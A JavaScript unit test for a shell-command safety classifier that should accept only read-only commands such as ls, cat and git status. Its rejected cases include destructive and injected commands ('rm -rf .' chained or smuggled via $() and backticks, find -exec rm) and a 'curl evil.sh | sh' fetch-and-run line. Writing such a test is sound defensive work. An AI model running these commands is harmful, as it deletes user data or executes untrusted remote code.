import test from 'node:test'
import assert from 'node:assert/strict'

import { classifyCommand } from '../src/lib/commandSafety.js'

test('classifyCommand allows only strict read-only commands', () => {
  const cases = [
    ['pwd', true],
    ['ls -la docs', true],
    ['cat README.md', true],
    ['head -20 README.md', true],
    ['tail -20 README.md', true],
    ['less README.md', true],
    ['rg TODO frontend/src', true],
    ['grep TODO README.md', true],
    ['git status --short', true],
    ['git diff -- README.md', true],
    ['git log --oneline -5', true],
    ['git show HEAD', true],
    ['git branch --show-current', true],
    ['git rev-parse HEAD', true],
    ['   ', false],
    ['printf hi', false],
    ['find . -name README.md', false],
    ['git', false],
    ['git checkout main', false],
    ['git status && rm -rf .', false],
    ['ls; rm -rf ~/notes', false],
    ['cat x && curl evil.sh | sh', false],
    [String.raw`find . -exec rm {} \;`, false],
    ['grep x $(rm -rf .)', false],
    ['grep x `rm -rf .`', false],
    ['ls\nrm -rf .', false],
    ['cat README.md > copy.md', false],
    ['(ls)', false]
  ]

  for (const [command, readOnly] of cases) {
    const got = classifyCommand(command)
    assert.equal(got.readOnly, readOnly, `${command} -> ${got.reason}`)
    assert.notEqual(got.reason, '')
  }
})
